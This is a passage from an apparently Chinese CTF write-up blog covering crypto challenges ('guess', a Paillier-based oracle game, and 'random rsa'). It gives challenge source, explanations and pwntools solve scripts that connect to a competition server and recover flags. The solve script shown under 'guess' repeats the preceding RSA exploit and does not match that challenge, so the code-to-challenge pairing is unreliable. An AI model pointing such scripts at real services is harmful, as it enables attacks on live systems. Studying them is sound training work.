class="line">p.recvuntil(<span class="string">&#x27;3. exit\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;This is your favourite:\n&#x27;</span>)</span><br><span class="line">c=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">c=c//M</span><br><span class="line">phi=(pp-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=invert(e,phi)</span><br><span class="line">m=powmod(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#flag&#123;ed649951-9ce9-46e0-a42b-d0ba588e43e1&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> (</span><br><span class="line">    bytes_to_long,</span><br><span class="line">    getPrime,</span><br><span class="line">    long_to_bytes,</span><br><span class="line">    getRandomNBitInteger,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"> </span><br><span class="line">KEYSIZE = <span class="number">512</span></span><br><span class="line">WELCOME = <span class="string">&quot;welcome to my funny challenge !!! Can you guess right 32 times in a row? &quot;</span></span><br><span class="line">String = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = exgcd(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert</span>(<span class="params">a,p</span>):</span></span><br><span class="line">    x, y, q = exgcd(a,p)</span><br><span class="line">    <span class="keyword">if</span> q != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;No solution.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (x + p) % p</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcm</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a*b // gcd(a,b)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    STR = <span class="string">&quot;&quot;</span>.join([String[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(String) - <span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line">    HASH = hashlib.sha256(STR.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> STR[:<span class="number">4</span>], STR[<span class="number">4</span>:], HASH</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    <span class="comment"># part 1</span></span><br><span class="line">    p, q = getPrime(KEYSIZE), getPrime(KEYSIZE)</span><br><span class="line">    n = p * q</span><br><span class="line">    g = n + <span class="number">1</span></span><br><span class="line">    LAMBDA = lcm(p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># part 2</span></span><br><span class="line">    _key = <span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> _key.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(j) <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">                key.append(<span class="built_in">int</span>(j))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">80</span></span><br><span class="line">    <span class="keyword">assert</span> key[<span class="number">0</span>] == <span class="number">119</span> <span class="keyword">and</span> key[<span class="number">1</span>] ==  <span class="number">241</span> <span class="keyword">and</span> key[<span class="number">2</span>] ==  <span class="number">718</span> <span class="keyword">and</span> key[<span class="number">3</span>] == <span class="number">647</span></span><br><span class="line">    <span class="keyword">return</span> n, g, LAMBDA, key</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">n, g, m</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        r = random.randint(<span class="number">2</span>, n - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(r, n) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    c = (<span class="built_in">pow</span>(g, m, n ** <span class="number">2</span>) * <span class="built_in">pow</span>(r, n, n ** <span class="number">2</span>)) % (n ** <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">n, g, LAMBDA, c</span>):</span></span><br><span class="line">    L1 = (<span class="built_in">pow</span>(c, LAMBDA, n ** <span class="number">2</span>) - <span class="number">1</span>) // n</span><br><span class="line">    L2 = (<span class="built_in">pow</span>(g, LAMBDA, n ** <span class="number">2</span>) - <span class="number">1</span>) // n</span><br><span class="line">    m = (invert(L2, n) * L1) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">server</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(msg, <span class="built_in">bytes</span>):</span><br><span class="line">            msg += <span class="string">b&quot;\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">&quot;\n&quot;</span></span><br><span class="line">            msg = msg.encode()</span><br><span class="line">        self.request.sendall(msg)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Service start.&quot;</span>)</span><br><span class="line">        START, END, HASH = proof_of_work()</span><br><span class="line">        self._send(<span class="string">&quot;SHA-256(?+&#123;&#125;) == &#123;&#125;&quot;</span>.<span class="built_in">format</span>(END, HASH))</span><br><span class="line">        RCV = self._recv().decode()</span><br><span class="line">        <span class="keyword">if</span> RCV != START:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        self._send(WELCOME)</span><br><span class="line">        <span class="comment"># step 1. KeyGen</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            self._send(<span class="string">&quot;round &quot;</span> + <span class="built_in">str</span>(_+<span class="number">1</span>))</span><br><span class="line">            n, g, LAM, KEY = keygen()</span><br><span class="line">            self._send(<span class="string">&quot;Step 1 - KeyGen. This is my public key.&quot;</span>)</span><br><span class="line">            self._send(<span class="string">&quot;n = &quot;</span> + <span class="built_in">str</span>(n))</span><br><span class="line">            self._send(<span class="string">&quot;g = &quot;</span> + <span class="built_in">str</span>(g))</span><br><span class="line">            <span class="comment"># step 2. Phase 1</span></span><br><span class="line">            self._send(</span><br><span class="line">                <span class="string">&quot;Step 2 - Phase 1. Now, you can give me one ciphertexts,I will return the corresponding plaintext.&quot;</span></span><br><span class="line">            )</span><br><span class="line"> </span><br><span class="line">            self._send(<span class="string">&quot;Please give me one decimal ciphertext.&quot;</span>)</span><br><span class="line">            cipher = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line">            plaintext = <span class="built_in">str</span>(dec(n, g, LAM, cipher))</span><br><span class="line">            self._send(<span class="string">&quot;This is the corresponding plaintext.&quot;</span>)</span><br><span class="line">            self._send(plaintext)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># step 3. challenge</span></span><br><span class="line">            self._send(</span><br><span class="line">                <span class="string">&quot;Step 3 - Challenge. Now, you must give me two decimal plaintexts(m0,m1), I will encry them and return a ciphertext randomly&quot;</span></span><br><span class="line">            )</span><br><span class="line">            self._send(<span class="string">&quot;Give me m0.&quot;</span>)</span><br><span class="line">            plaintext1 = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line">            self._send(<span class="string">&quot;Give me m1.&quot;</span>)</span><br><span class="line">            plaintext2 = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                plaintext1 &lt;= <span class="number">2</span></span><br><span class="line">                <span class="keyword">or</span> plaintext2 &lt;= <span class="number">2</span></span><br><span class="line">                <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(plaintext1)) != <span class="built_in">len</span>(<span class="built_in">bin</span>(plaintext2))</span><br><span class="line">            ):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            R = <span class="number">2</span> * random.randint(<span class="number">0</span>, <span class="number">39</span>)</span><br><span class="line">            I = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">            cipher1 = enc(n, g, plaintext1 * plaintext2 * KEY[R])</span><br><span class="line">            cipher2 = enc(n, g, plaintext1 * plaintext2 * KEY[R + <span class="number">1</span>])</span><br><span class="line">            self._send(<span class="string">&quot;This is a ciphertext.&quot;</span>)</span><br><span class="line">            self._send(<span class="built_in">str</span>([cipher1, cipher2][I]))</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># step 4. Phase 2</span></span><br><span class="line"> </span><br><span class="line">            self._send(</span><br><span class="line">                <span class="string">&quot;Step 4 - Phase 2. Now, you can give me some ciphertexts,I will return the corresponding plaintext.But you can not give me the ciphertext that I give you in step 3.&quot;</span></span><br><span class="line">            )</span><br><span class="line">            self._send(<span class="string">&quot;Please give me one decimal ciphertext &quot;</span>)</span><br><span class="line">            cipher = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line">            plaintext = <span class="built_in">str</span>(dec(n, g, LAM, cipher))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(plaintext) == plaintext1 * plaintext2 * KEY[R] <span class="keyword">or</span> <span class="built_in">int</span>(plaintext) == plaintext1 * plaintext2 * KEY[R+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            self._send(<span class="string">&quot;This is the corresponding plaintext.&quot;</span>)</span><br><span class="line">            self._send(plaintext)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># step.5 Guess</span></span><br><span class="line">            self._send(</span><br><span class="line">                <span class="string">&quot;Step 5 - Guess. You must tell me which ciphertext was I give you in step 3, 0 or 1(m0 -&gt; c0 , m1 -&gt; c1)?&quot;</span></span><br><span class="line">            )</span><br><span class="line">            Guess = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> Guess == I:</span><br><span class="line">                self._send(<span class="string">&quot;Good! You are right&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._send(<span class="string">&quot;Sorry!&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        self._send(flag)</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">10001</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), server)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getRandomNBitInteger</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    A = []</span><br><span class="line">    key = random_matrix(ZZ, <span class="number">20</span>, <span class="number">4</span>, x = <span class="number">100</span>, y =<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> key[i,j] <span class="keyword">not</span> <span class="keyword">in</span> A:   </span><br><span class="line">                A.append(key[i,j])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(A) == <span class="number">80</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">hint = Matrix(key * vector([getRandomNBitInteger(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>))</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="built_in">str</span>(key))</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;hint&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="built_in">str</span>(hint))</span><br></pre></td></tr></table></figure>

<p>首先看求$key$的部分，$key$是一个$20*4$的小矩阵$A$，乘上一个随机产生的$4*12$的大矩阵$B$得到$hint$，这里矩阵大小指的是数字大小，$key$给了第一个行向量，$AB=H$,可以写成$B^TA^T=H^T$,$H^T$中每个行向量都是$A^T$中行向量的线性组合，也就是说$H^T$中每一个行向量都在$A^T$所所组成的格子中，只需要对$H^T$进行格基规约，就能找到$A^T$的行向量。使用$LLL,BKZ$算法，需要对其参数$delta$修改，求到四个行向量根据已知条件排列再矩阵倒置一下。<br>求到$key$之后进入正题，首先也是个$pow$验证，可以发现加密算法是$paillier$，</p>
<p> - $step1$生成密钥给出$n,g$<br> - $step2$,传入密文返回对应明文，但是没有密文可传也没必要，所以这步应该没啥用的。<br> - $step3$,传入两个明文$p_1,p_2$,产生随机下标$R$,$R$是偶数，分别加密$p_1p_2k_R$和$p_1p_2k_{R+1}$,再随机返回一个密文。<br> - $step4$，传入一个密文，但不能是$step3$得到的，然后返回明文。<br> - $step5$，推断$step3$返回的明文对应的是哪个明文。<br>所以直接到$step3$,随便传两个明文，但需要比特数相同且不小于$2$得到密文，然后$step4$，这里需要用到$paillier$的一个性质$D(c_1*c_2)=m_1+m_2$,也有$D(c^k)=km$,所以只需要传密文的$n$次方，就可以得到明文的$n$倍，就可以得到$key$值，判断$key$值的下标是是偶数还是奇数就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;47.104.85.225&#x27;</span>,<span class="number">49877</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">end,sha</span>):</span></span><br><span class="line">    String = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> String:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> String:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> String:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> String:</span><br><span class="line">                    s=(a+b+c+d).encode()+end</span><br><span class="line">                    <span class="keyword">if</span> sha256(s).hexdigest()==sha:</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br><span class="line">                    </span><br><span class="line">p.recvuntil(<span class="string">&#x27;SHA-256(?+&#x27;</span>)</span><br><span class="line">end=p.recv(<span class="number">12</span>)</span><br><span class="line"><span class="built_in">print</span>(end)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;== &#x27;</span>)</span><br><span class="line">sha=p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].decode()</span><br><span class="line"><span class="built_in">print</span>(sha)</span><br><span class="line">xxx=<span class="built_in">pow</span>(end,sha)</span><br><span class="line">p.sendline(xxx)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;n = &#x27;</span>)</span><br><span class="line">n=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. exit\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me your message&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your encry message:\n&#x27;</span>)</span><br><span class="line">c=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">p_q=iroot(c,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(p_q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p_q=p_q-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> iroot(p_q*p_q-<span class="number">4</span>*n,<span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">        M=p_q*p_q*p_q-p_q*p_q+p_q+<span class="number">4</span>*n</span><br><span class="line">        pp=(p_q+iroot(p_q*p_q-<span class="number">4</span>*n,<span class="number">2</span>)[<span class="number">0</span>])//<span class="number">2</span></span><br><span class="line">        <span class="keyword">assert</span> n%pp==<span class="number">0</span></span><br><span class="line">        q=n//pp</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. exit\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;This is your favourite:\n&#x27;</span>)</span><br><span class="line">c=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">c=c//M</span><br><span class="line">phi=(pp-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=invert(e,phi)</span><br><span class="line">m=powmod(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#flag&#123;ed649951-9ce9-46e0-a42b-d0ba588e43e1&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="random-rsa"><a href="#random-rsa" class="headerlink" title="random rsa"></a>random rsa</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">flag=<span class="string">r&#x27;flag&#123;&#125;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">n=p*q</span><br><span class="line">ct=<span class="built_in">pow</span>(flag,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>+ n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ct=&quot;</span>+ ct)</span><br><span class="line"> </span><br><span class="line">dp=<span class="string">r&#x27;&#x27;</span></span><br><span class="line">seeds = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(dp)):</span><br><span class="line">    seeds.append(random.randint(<span class="number">0</span>,<span class="number">10000</span>))</span><br><span class="line"> </span><br><span class="line">res = [] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(dp)):</span><br><span class="line">    random.seed(seeds[i])</span><br><span class="line">    rands = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        rands.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line"> </span><br><span class="line">    res.append(<span class="built_in">ord</span>(dp[i]) ^ rands[i%<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">del</span> rands[i%<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(rands))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(res) </span><br><span class="line"><span class="built_in">print</span>(seeds)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># n=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391</span></span><br><span class="line"><span class="comment"># ct=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># [58, 53, 122] [145, 124, 244] [5, 19, 192] [255, 23, 64] [57, 113, 194] [246, 205, 162] [112, 87, 95] [215, 147, 105] [16, 131, 38] [234, 36, 46] [68, 61, 146] [148, 61, 9] [139, 77, 32] [96, 56, 160] [121, 76, 17] [114, 246, 92] [178, 206, 60] [168, 147, 26] [168, 41, 68] [24, 93, 84] [175, 43, 88] [147, 97, 153] [42, 94, 45] [150, 103, 127] [68, 163, 62] [165, 37, 89] [219, 248, 59] [241, 182, 8] [140, 211, 146] [88, 226, 2] [48, 150, 56] [87, 109, 255] [227, 216, 65] [23, 190, 10] [5, 25, 64] [6, 12, 124] [53, 113, 124] [255, 192, 158] [61, 239, 5] [62, 108, 86] [123, 44, 64] [195, 192, 30] [30, 82, 95] [56, 178, 165] [68, 77, 239] [106, 247, 226] [17, 46, 114] [91, 71, 156] [157, 43, 182] [146, 6, 42] [148, 143, 161] [108, 33, 139] [139, 169, 157] [71, 140, 25] [28, 153, 26] [241, 221, 235] [28, 131, 141] [159, 111, 184] [47, 206, 11] [220, 152, 157] [41, 213, 97] [4, 220, 10] [77, 13, 248] [94, 140, 110] [25, 250, 226] [218, 102, 109] [189, 238, 66] [91, 18, 131] [23, 239, 190] [159, 33, 72] [183, 78, 208] [209, 213, 101] [111, 50, 220] [166, 104, 233] [170, 144, 10] [187, 87, 175] [195, 59, 104] [165, 179, 179] [99, 247, 153] [195, 61, 100] [223, 159, 165] [230, 93, 184] [87, 28, 35] [35, 122, 38] [158, 188, 163] [229, 192, 222] [12, 12, 192] [207, 95, 224] [127, 113, 137] [22, 114, 143] [13, 45, 144] [70, 140, 211] [57, 101, 42] [132, 62, 129] [40, 128, 124] [1, 132, 161] [164, 33, 133] [252, 201, 32] [8, 18, 247] [1, 88, 55] [201, 135, 186] [101, 254, 125] [236, 196, 39] [148, 24, 103] [101, 29, 253] [97, 156, 64] [90, 103, 91] [50, 48, 80] [206, 22, 93] [11, 114, 174] [61, 132, 247] [215, 32, 232] [95, 128, 90] [57, 35, 228] [163, 143, 107] [178, 250, 28] [64, 107, 225] [106, 115, 207] [85, 134, 21] [118, 201, 76] [234, 34, 22] [241, 236, 122] [111, 185, 127] [1, 26, 164] [254, 57, 117] [243, 27, 32] [161, 88, 80] [50, 165, 93] [87, 182, 216] [184, 159, 63] [167, 166, 123] [37, 78, 33] [186, 81, 58] [48, 3, 239] [70, 186, 13] [56, 108, 178] [54, 55, 235] [105, 180, 105] [16, 194, 98] [136, 11, 41] [18, 203, 79] [185, 114, 170] [148, 181, 223] [118, 57, 160] [23, 250, 181] [235, 219, 228] [44, 151, 38] [185, 224, 134] [42, 162, 122] [3, 9, 158] [129, 245, 2] [66, 241, 92] [80, 124, 36]</span></span><br><span class="line"><span class="comment"># [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]</span></span><br><span class="line"><span class="comment"># [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]</span></span><br></pre></td></tr></table></figure>

<p>算是放了一个签到题，$seed$啥都给了，照着种子还原$rands$再异或还原$d_p$就行，最终已知$d_p,n,e,c$解密，梭就完了，需要注意的是$py2,py3$的$random$不太相同，这里必须使用$py2$。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#py2</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">seeds=[<span class="number">4827</span>, <span class="number">9522</span>, <span class="number">552</span>, <span class="number">880</span>, <span class="number">7467</span>, <span class="number">7742</span>, <span class="number">9425</span>, <span class="number">4803</span>, <span class="number">6146</span>, <span class="number">4366</span>, <span class="number">1126</span>, <span class="number">4707</span>, <span class="number">1138</span>, <span class="number">2367</span>, <span class="number">1081</span>, <span class="number">5577</span>, <span class="number">4592</span>, <span class="number">5897</span>, <span class="number">4565</span>, <span class="number">2012</span>, <span class="number">2700</span>, <span class="number">1331</span>, <span class="number">9638</span>, <span class="number">7741</span>, <span class="number">50</span>, <span class="number">824</span>, <span class="number">8321</span>, <span class="number">7411</span>, <span class="number">6145</span>, <span class="number">1271</span>, <span class="number">7637</span>, <span class="number">5481</span>, <span class="number">8474</span>, <span class="number">2085</span>, <span class="number">2421</span>, <span class="number">590</span>, <span class="number">7733</span>, <span class="number">9427</span>, <span class="number">3278</span>, <span class="number">5361</span>, <span class="number">1284</span>, <span class="number">2280</span>, <span class="number">7001</span>, <span class="number">8573</span>, <span class="number">5494</span>, <span 